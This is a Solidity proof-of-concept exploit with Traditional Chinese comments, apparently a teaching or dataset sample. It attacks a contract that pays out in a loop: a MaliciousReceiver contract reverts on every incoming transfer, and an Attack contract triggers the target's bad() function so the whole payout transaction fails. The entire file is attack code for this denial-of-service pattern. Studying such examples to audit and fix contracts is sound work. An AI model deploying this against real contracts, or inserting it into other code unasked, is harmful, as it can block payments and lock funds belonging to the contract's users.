// 攻擊合約範例：
// 此合約用於攻擊存在Improper Exception Handling in a Loop漏洞的合約
// 攻擊方法：利用一個惡意合約，使得在迴圈中執行transfer時強制回退（revert），導致整個交易失敗

contract MaliciousReceiver {
    // 當合約接收到轉帳時自動觸發fallback並回退
    fallback() external payable {
        revert("MaliciousReceiver: rejecting funds");
    }
}

// 假設漏洞合約名稱為 CallsInLoop，並在部署時傳入包含受害合約地址的陣列
interface ICallsInLoop {
    function bad() external;
}

contract Attack {
    ICallsInLoop public target;
    MaliciousReceiver public maliciousReceiver;

    // 部署時傳入漏洞合約的地址
    constructor(address _target) public {
        target = ICallsInLoop(_target);
        // 部署惡意接收合約
        maliciousReceiver = new MaliciousReceiver();
    }

    // 本攻擊合約的目的在於呼叫漏洞合約的 bad() 函式，讓迴圈中遇到惡意合約而失敗
    function attack() public {
        // 攻擊前需確保漏洞合約的 destinations 陣列中已包含 maliciousReceiver 的地址
        // 否則須先透過其他方法將 maliciousReceiver 加入目標合約的 destinations 陣列
        target.bad();
    }
}
